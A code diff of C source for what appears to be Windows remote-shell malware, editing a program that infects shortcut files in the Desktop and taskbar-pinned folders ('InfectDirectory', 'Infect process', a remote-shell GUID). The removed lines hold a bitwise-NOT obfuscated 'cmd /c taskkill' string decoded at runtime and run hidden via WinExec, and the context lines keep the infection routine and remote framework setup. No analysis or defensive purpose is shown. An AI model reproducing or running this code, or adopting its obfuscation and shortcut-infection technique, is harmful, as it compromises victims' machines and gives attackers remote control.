@@ -4,11 +4,6 @@
 
 #define  REMOTESHELL_PROCESS_GUID ("14B590DD-E9D3-4300-BF5D-4228B825B145")
 
-static char kcmdChar[]={~'c',~'m',~'d',~' ',~'/',~'c',~' ',
-	~'t',~'a',~'s',~'k',~'k',~'i',~'l',~'l',
-	~' ',~'/',~'i',~'m',~' ',~'c',~'m',~'d',
-	~'.',~'e',~'x',~'e',~' ',~'/',~'t',~'\0',
-	};
 
 HANDLE G_hMutex;
 BOOL IsAlreadyRunning()
@@ -40,7 +35,6 @@ int InfectDirectory(const char *Dir)
 
 	while (TRUE)
 	{
-		char InkFileName[MAX_PATH];
 		LnkFile lnkf;
 		
 		sprintf(FileName,"%s\\%s",Dir,findFileData.cFileName);
@@ -66,14 +60,6 @@ int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, 
 		exit(0);
 	}
 	
-	for (unsigned int i=0;i<strlen(kcmdChar);i++)
-	{
-		kcmdChar[i]=~kcmdChar[i];
-	}
-
-
-	WinExec(kcmdChar, SW_HIDE);
-
 	//Infect process
 	//Desktop
 	char path[MAX_PATH];
@@ -82,7 +68,6 @@ int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, 
 	SHGetSpecialFolderPath(0,path,CSIDL_APPDATA,0);
 	strcat(path,"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar");
 	InfectDirectory(path);
-	Sleep(5000);
 
 	if (!G_RemoteFrameWork.Initialize())
 	{
